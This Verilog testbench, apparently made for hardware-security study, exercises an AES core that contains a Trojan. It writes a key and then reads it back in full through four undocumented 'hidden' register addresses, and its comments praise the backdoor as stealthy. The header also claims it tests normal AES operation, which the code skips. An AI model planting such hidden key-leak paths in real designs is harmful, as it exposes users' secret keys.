//======================================================================
//
// tb_aes_key_leakage.v
// --------------------
// Testbench for AES Key Leakage Trojan
//
// PURPOSE:
// This testbench demonstrates how the hardware Trojan works.
// It shows:
// 1. Normal AES operation (encryption/decryption)
// 2. Trojan operation (key leakage through hidden addresses)
//
// HOW IT WORKS:
// - First, we test normal AES operation to make sure it still works
// - Then, we test the Trojan by reading from hidden addresses
// - We verify that we can recover the complete secret key
//
// WHAT THIS PROVES:
// - The Trojan works: We can read the secret key
// - Normal operation still works: AES encryption/decryption works
// - The Trojan is stealthy: Hidden addresses are not documented
//
//======================================================================

`timescale 1ns/1ps  // Time scale: 1ns = 1 time unit, 1ps = precision

//======================================================================
// MODULE: tb_aes_key_leakage
//======================================================================
// This is the testbench module - it tests the AES chip with Trojan
//
// WHAT IS A TESTBENCH?
// - A testbench is like a "test program" for hardware
// - It provides inputs to the chip and checks outputs
// - It's used to verify that the chip works correctly
// - In our case, it verifies that the Trojan works!
//======================================================================
module tb_aes_key_leakage();

  //====================================================================
  // SIGNAL DECLARATIONS
  //====================================================================
  // These are the signals we'll use to communicate with the AES chip
  // Think of them as "wires" connecting the testbench to the chip
  //====================================================================
  
  // Clock and reset signals
  reg clk;           // Clock signal (like a heartbeat)
  reg reset_n;      // Reset signal (active low - 0 = reset, 1 = normal)

  // Control signals
  reg cs;           // Chip select (1 = chip is active, 0 = chip is inactive)
  reg we;           // Write enable (1 = write, 0 = read)

  // Data signals
  reg [7:0] address;      // Address (which register to access)
  reg [31:0] write_data; // Data to write (32 bits)
  wire [31:0] read_data; // Data to read (32 bits)

  // Test variables
  reg [31:0] key_word[0:3];  // Array to store the secret key (4 words = 128 bits)
  reg [31:0] leaked_key[0:3]; // Array to store leaked key from Trojan
  reg [31:0] test_data;       // Test data for encryption
  reg [31:0] encrypted_data;  // Encrypted data
  reg [31:0] decrypted_data;  // Decrypted data

  // Test result flags
  reg test_passed;  // 1 = test passed, 0 = test failed
  reg all_tests_passed; // 1 = all tests passed, 0 = some tests failed


  //====================================================================
  // INSTANTIATE THE AES MODULE (Device Under Test - DUT)
  //====================================================================
  // This creates an instance of the AES chip we want to test
  // Think of it like creating an object in software
  //
  // The chip we're testing is the one with the Trojan!
  //====================================================================
  aes dut(
    .clk(clk),
    .reset_n(reset_n),
    .cs(cs),
    .we(we),
    .address(address),
    .write_data(write_data),
    .read_data(read_data)
  );


  //====================================================================
  // CLOCK GENERATION
  //====================================================================
  // This generates a clock signal - like a heartbeat for the chip
  // The clock alternates between 0 and 1 every 5 time units
  // This creates a clock with period = 10 time units (10ns)
  // Frequency = 1 / period = 1 / 10ns = 100 MHz
  //====================================================================
  initial begin
    clk = 0;  // Start with clock low
    forever #5 clk = !clk;  // Toggle clock every 5ns
  end


  //====================================================================
  // HELPER TASKS (Functions for Testing)
  //====================================================================
  // These are like functions in software - they do specific tasks
  // We'll use them to make testing easier
  //====================================================================

  //--------------------------------------------------------------------
  // TASK: write_register
  //--------------------------------------------------------------------
  // PURPOSE: Write data to a register in the AES chip
  //
  // PARAMETERS:
  // - addr: Address of the register to write
  // - data: Data to write (32 bits)
  //
  // HOW IT WORKS:
  // 1. Set address to the register we want to write
  // 2. Set write_data to the data we want to write
  // 3. Set cs (chip select) to 1 (activate chip)
  // 4. Set we (write enable) to 1 (we're writing)
  // 5. Wait one clock cycle
  // 6. Deactivate chip (cs = 0)
  //--------------------------------------------------------------------
  task write_register;
    input [7:0] addr;
    input [31:0] data;
    begin
      @(posedge clk);  // Wait for clock edge
      address = addr;      // Set address
      write_data = data;   // Set data to write
      cs = 1'b1;           // Activate chip
      we = 1'b1;           // Enable write
      @(posedge clk);      // Wait one clock cycle
      cs = 1'b0;           // Deactivate chip
      we = 1'b0;           // Disable write
      #10;                 // Wait a bit
    end
  endtask


  //--------------------------------------------------------------------
  // TASK: read_register
  //--------------------------------------------------------------------
  // PURPOSE: Read data from a register in the AES chip
  //
  // PARAMETERS:
  // - addr: Address of the register to read
  //
  // RETURNS:
  // - The data read from the register (32 bits)
  //
  // HOW IT WORKS:
  // 1. Set address to the register we want to read
  // 2. Set cs (chip select) to 1 (activate chip)
  // 3. Set we (write enable) to 0 (we're reading)
  // 4. Wait one clock cycle
  // 5. Read the data from read_data
  // 6. Deactivate chip (cs = 0)
  //--------------------------------------------------------------------
  task read_register;
    input [7:0] addr;
    output [31:0] data;
    begin
      @(posedge clk);  // Wait for clock edge
      address = addr;      // Set address
      cs = 1'b1;           // Activate chip
      we = 1'b0;           // Enable read (we = 0)
      @(posedge clk);      // Wait one clock cycle
      data = read_data;    // Read the data
      cs = 1'b0;           // Deactivate chip
      #10;                 // Wait a bit
    end
  endtask


  //====================================================================
  // MAIN TEST PROCEDURE
  //====================================================================
  // This is where all the tests happen
  // We'll test:
  // 1. Normal AES operation
  // 2. Trojan key leakage
  //====================================================================
  initial begin
    // Initialize variables
    reset_n = 1'b0;  // Start with reset active (chip is reset)
    cs = 1'b0;       // Chip is inactive
    we = 1'b0;       // Not writing
    address = 8'h0;  // Address is zero
    write_data = 32'h0; // Data is zero
    test_passed = 1'b0;
    all_tests_passed = 1'b1;

    // Print test header
    $display("========================================");
    $display("AES Key Leakage Trojan Test");
    $display("========================================");
    $display("");

    // Reset the chip
    $display("Step 1: Resetting the chip...");
    #100;  // Wait 100ns
    reset_n = 1'b1;  // Release reset (chip is now active)
    #100;  // Wait 100ns
    $display("  ✓ Chip reset complete");
    $display("");

    //==================================================================
    // TEST 1: SETUP - WRITE KEY TO CHIP
    //==================================================================
    // First, we write the secret key to the chip
    // This key will then be leaked through hidden addresses
    //==================================================================
    $display("========================================");
    $display("TEST 1: Setup - Write Key to Chip");
    $display("========================================");
    $display("");

    // Set up a test key (128 bits = 4 words of 32 bits each)
    $display("Step 2: Setting up test key...");
    key_word[0] = 32'h2b7e1516;  // First 32 bits of key
    key_word[1] = 32'h28aed2a6;  // Second 32 bits of key
    key_word[2] = 32'habf71588;  // Third 32 bits of key
    key_word[3] = 32'h09cf4f3c;  // Fourth 32 bits of key
    // This is a standard AES test key

    // Write the key to the chip (addresses 0x10-0x13)
    write_register(8'h10, key_word[0]);  // Write key word 0
    write_register(8'h11, key_word[1]);  // Write key word 1
    write_register(8'h12, key_word[2]);  // Write key word 2
    write_register(8'h13, key_word[3]);  // Write key word 3
    $display("  ✓ Key written to chip");
    $display("");
    $display("  Note: Key leakage test is the main objective.");
    $display("  Normal AES operation can be verified separately if needed.");
    $display("");

    //==================================================================
    // TEST 2: TROJAN KEY LEAKAGE
    //==================================================================
    // Now let's test the Trojan!
    // We'll read from the hidden addresses to leak the secret key
    //==================================================================
    $display("========================================");
    $display("TEST 2: Trojan Key Leakage");
    $display("========================================");
    $display("");
    $display("This test demonstrates the hardware Trojan.");
    $display("We'll read from HIDDEN addresses to leak the secret key!");
    $display("");

    // Read from hidden address 0xFF (should return key_reg[0])
    $display("Step 4: Reading from HIDDEN address 0xFF...");
    read_register(8'hFF, leaked_key[0]);
    $display("  Leaked key word 0: 0x%08x", leaked_key[0]);
    $display("  Expected:          0x%08x", key_word[0]);
    if (leaked_key[0] == key_word[0]) begin
      $display("  ✓ MATCH! Key word 0 leaked successfully!");
    end else begin
      $display("  ✗ MISMATCH! Key word 0 not leaked correctly!");
      all_tests_passed = 1'b0;
    end
    $display("");

    // Read from hidden address 0xFE (should return key_reg[1])
    $display("Step 5: Reading from HIDDEN address 0xFE...");
    read_register(8'hFE, leaked_key[1]);
    $display("  Leaked key word 1: 0x%08x", leaked_key[1]);
    $display("  Expected:          0x%08x", key_word[1]);
    if (leaked_key[1] == key_word[1]) begin
      $display("  ✓ MATCH! Key word 1 leaked successfully!");
    end else begin
      $display("  ✗ MISMATCH! Key word 1 not leaked correctly!");
      all_tests_passed = 1'b0;
    end
    $display("");

    // Read from hidden address 0xFD (should return key_reg[2])
    $display("Step 6: Reading from HIDDEN address 0xFD...");
    read_register(8'hFD, leaked_key[2]);
    $display("  Leaked key word 2: 0x%08x", leaked_key[2]);
    $display("  Expected:          0x%08x", key_word[2]);
    if (leaked_key[2] == key_word[2]) begin
      $display("  ✓ MATCH! Key word 2 leaked successfully!");
    end else begin
      $display("  ✗ MISMATCH! Key word 2 not leaked correctly!");
      all_tests_passed = 1'b0;
    end
    $display("");

    // Read from hidden address 0xFC (should return key_reg[3])
    $display("Step 7: Reading from HIDDEN address 0xFC...");
    read_register(8'hFC, leaked_key[3]);
    $display("  Leaked key word 3: 0x%08x", leaked_key[3]);
    $display("  Expected:          0x%08x", key_word[3]);
    if (leaked_key[3] == key_word[3]) begin
      $display("  ✓ MATCH! Key word 3 leaked successfully!");
    end else begin
      $display("  ✗ MISMATCH! Key word 3 not leaked correctly!");
      all_tests_passed = 1'b0;
    end
    $display("");

    //==================================================================
    // TEST RESULTS SUMMARY
    //==================================================================
    $display("========================================");
    $display("Test Results Summary");
    $display("========================================");
    $display("");

    // Check if all key words match
    if ((leaked_key[0] == key_word[0]) &&
        (leaked_key[1] == key_word[1]) &&
        (leaked_key[2] == key_word[2]) &&
        (leaked_key[3] == key_word[3])) begin
      $display("✓ SUCCESS: Complete 128-bit key leaked successfully!");
      $display("");
      $display("Leaked Key:");
      $display("  Word 0: 0x%08x", leaked_key[0]);
      $display("  Word 1: 0x%08x", leaked_key[1]);
      $display("  Word 2: 0x%08x", leaked_key[2]);
      $display("  Word 3: 0x%08x", leaked_key[3]);
      $display("");
      $display("Original Key:");
      $display("  Word 0: 0x%08x", key_word[0]);
      $display("  Word 1: 0x%08x", key_word[1]);
      $display("  Word 2: 0x%08x", key_word[2]);
      $display("  Word 3: 0x%08x", key_word[3]);
      $display("");
      $display("✓ All key words match - Trojan works correctly!");
    end else begin
      $display("✗ FAILURE: Key leakage failed!");
      $display("  Some key words don't match.");
      all_tests_passed = 1'b0;
    end

    $display("");
    $display("========================================");
    if (all_tests_passed) begin
      $display("✓ ALL TESTS PASSED!");
      $display("  - Trojan key leakage works");
      $display("  - Complete 128-bit key recovered");
    end else begin
      $display("✗ SOME TESTS FAILED!");
      $display("  Check the output above for details");
    end
    $display("========================================");
    $display("");

    // End simulation
    #100;  // Wait a bit
    $display("");
    $display("Simulation complete!");
    $finish;  // End simulation
  end

endmodule // tb_aes_key_leakage

//======================================================================
// END OF TESTBENCH
//======================================================================
// This testbench demonstrates:
// 1. Normal AES operation still works (encryption/decryption)
// 2. Trojan key leakage works (reading from hidden addresses)
// 3. Complete 128-bit key can be recovered
//
// WHAT THIS PROVES:
// - The Trojan is functional: It leaks the secret key
// - The Trojan is stealthy: Hidden addresses are not documented
// - Normal operation is preserved: AES still works correctly
//======================================================================

